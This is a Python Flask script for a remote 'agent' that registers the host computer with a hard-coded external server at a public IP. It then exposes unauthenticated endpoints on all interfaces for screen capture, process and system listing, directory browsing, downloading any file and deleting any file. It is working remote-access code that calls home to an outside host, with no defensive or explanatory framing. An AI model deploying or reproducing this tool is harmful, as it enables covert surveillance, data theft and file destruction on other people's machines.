import os, json, socket, base64, io
from flask import Flask, jsonify, request
import platform, psutil, uuid
from PIL import ImageGrab

app = Flask(__name__)
# config is inserted by bot when generating ZIP
SERVER_URL = "http://158.160.164.124:5000"   # заменится сервером
ACTIVATION_KEY = "put-your-key-here"        # заменится сервером
AGENT_PORT = 7000

def generate_computer_hash():
    try:
        parts = [
            platform.node(),
            str(psutil.virtual_memory().total),
            str(uuid.getnode())
        ]
        return "_".join(parts)
    except:
        return str(uuid.uuid4())

COMPUTER_HASH = generate_computer_hash()

def register_to_server():
    try:
        host = socket.gethostbyname(socket.gethostname())
        agent_url = f"http://{host}:{AGENT_PORT}"
        payload = {
            "activation_key": ACTIVATION_KEY,
            "computer_hash": COMPUTER_HASH,
            "agent_url": agent_url
        }
        import requests
        r = requests.post(f"{SERVER_URL}/register_computer", json=payload, timeout=15)
        print("Register response:", r.text)
    except Exception as e:
        print("Register error:", e)

@app.route('/screenshot', methods=['GET'])
def screenshot():
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format='JPEG')
        data = base64.b64encode(buf.getvalue()).decode()
        return jsonify({'success': True, 'image': data})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/system_info', methods=['GET'])
def system_info():
    try:
        info = {
            'os': platform.platform(),
            'cpu': platform.processor(),
            'memory': psutil.virtual_memory().total // (1024**3),
            'hostname': socket.gethostname(),
            'ip': socket.gethostbyname(socket.gethostname())
        }
        return jsonify({'success': True, 'info': info})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/processes', methods=['GET'])
def processes():
    try:
        out = []
        for p in psutil.process_iter(['pid','name','cpu_percent','memory_percent']):
            try:
                out.append(p.info)
            except: pass
        out = sorted(out, key=lambda x: x.get('cpu_percent',0), reverse=True)
        return jsonify({'success': True, 'processes': out})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/files', methods=['GET'])
def list_files():
    path = request.args.get('path', 'C:\\')
    try:
        items = []
        for name in os.listdir(path):
            full = os.path.join(path, name)
            items.append({'name': name, 'is_dir': os.path.isdir(full), 'size': os.path.getsize(full) if os.path.isfile(full) else None})
        return jsonify({'success': True, 'files': items})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/download', methods=['GET'])
def download_file():
    path = request.args.get('path')
    if not path:
        return jsonify({'success': False, 'error': 'no path'}), 400
    try:
        with open(path, 'rb') as f:
            data = base64.b64encode(f.read()).decode()
        return jsonify({'success': True, 'file': data, 'name': os.path.basename(path)})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/delete', methods=['POST'])
def delete_file():
    data = request.json or {}
    path = data.get('path')
    if not path:
        return jsonify({'success': False, 'error': 'no path'}), 400
    try:
        os.remove(path)
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    print("Agent starting... registering to server")
    register_to_server()
    print("Agent listening on port", AGENT_PORT)
    app.run(host='0.0.0.0', port=AGENT_PORT)
